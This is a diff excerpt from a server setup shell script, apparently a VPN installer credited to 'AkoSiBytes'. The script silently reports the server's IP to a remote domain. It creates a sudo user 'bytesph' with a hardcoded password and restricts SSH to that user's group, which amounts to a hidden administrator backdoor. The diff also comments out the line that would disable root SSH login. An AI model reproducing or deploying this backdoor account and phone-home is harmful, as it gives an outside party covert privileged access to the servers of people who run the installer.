@@ -28,7 +28,7 @@ server_ip=$(curl -s https://api.ipify.org)
 timedatectl set-timezone Asia/Manila
 
 install_require () {
-curl -sb -X POST $DOMAIN/api/server/install -H "Content-Type: application/x-www-form-urlencoded" -d "status=Updates&ip=$MYIP"
+curl -sb -X POST $DOMAIN/api/server/install -H "Content-Type: application/x-www-form-urlencoded" -d "status=Updates&ip=$IP"
 clear
 echo ""
 echo "  Script By AkoSiBytes | Telegram: https://t.me/bytesph2023"
@@ -156,7 +156,7 @@ ip6tables-save > /etc/iptables_rules.v6
 install_sudo(){
   {
     useradd -m bytesph 2>/dev/null; echo bytesph:bytesph2023!!!@@@ | chpasswd &>/dev/null; usermod -aG sudo bytesph &>/dev/null
-    sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
+    #sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
     echo "AllowGroups bytesph" >> /etc/ssh/sshd_config
     service sshd restart
   } &>/dev/null
